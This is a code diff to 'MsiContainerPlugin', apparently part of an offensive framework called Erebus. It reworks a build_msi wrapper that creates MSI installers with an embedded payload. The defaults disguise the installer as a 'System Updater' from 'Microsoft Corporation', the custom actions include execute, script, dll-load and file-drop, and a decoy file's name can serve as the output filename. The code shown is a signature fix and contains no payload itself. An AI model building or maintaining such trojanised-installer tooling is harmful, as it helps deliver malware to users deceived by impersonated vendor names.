@@ -85,50 +85,46 @@ class MsiContainerPlugin(ErebusPlugin):
     def build_msi(
         self,
         build_path: pathlib.Path,
-        product_name: str = "Update",
+        app_name: str = "System Updater",
         manufacturer: str = "Microsoft Corporation",
-        version: str = "1.0.0",
-        use_admin: bool = False,
-        action_type: str = "execute",
+        install_scope: str = "User",
+        *,
+        product_name: str = None,
+        version: str = None,
+        use_admin: bool = None,
+        action_type: str = None,
         action_args: str = None,
         output_name: str = None,
-        decoy_path: pathlib.Path = None
+        decoy_path: pathlib.Path = None,
     ) -> pathlib.Path:
         """
         Build a new MSI installer with embedded payload.
-        
-        Args:
-            build_path: Path to the build directory
-            product_name: Name of the product
-            manufacturer: Manufacturer name
-            version: Product version
-            use_admin: Require administrator privileges
-            action_type: Type of custom action (execute, script, dll-load, file-drop)
-            action_args: Arguments for the custom action
-            output_name: Custom output filename
-            decoy_path: Optional path to a decoy file for filename matching
-            
-        Returns:
-            pathlib.Path: Path to the created MSI file
-            
-        Raises:
-            RuntimeError: If MSI creation fails
+
+        Signature mirrors ``archive.container_msi.build_msi`` so that
+        builder.py can invoke this plugin-bound symbol with the same
+        kwargs (``app_name`` / ``install_scope``) that the underlying
+        implementation expects. Earlier revisions of this wrapper
+        declared ``product_name`` positionally and omitted
+        ``install_scope`` entirely, which caused builder.py's MSI build
+        path to die with TypeError before the underlying container_msi
+        function was ever reached.
         """
         container_msi = self._get_container_msi()
-        
-        # LOGIC ADJUSTMENT: Handle dynamic output naming based on decoy if present
+
         if output_name is None and decoy_path is not None:
-             output_name = f"{decoy_path.name}.msi"
+            output_name = f"{decoy_path.name}.msi"
 
         return container_msi.build_msi(
             build_path=build_path,
-            product_name=product_name,
+            app_name=app_name,
             manufacturer=manufacturer,
+            install_scope=install_scope,
+            product_name=product_name,
             version=version,
             use_admin=use_admin,
             action_type=action_type,
             action_args=action_args,
-            output_name=output_name
+            output_name=output_name,
         )
     
     def hijack_msi(
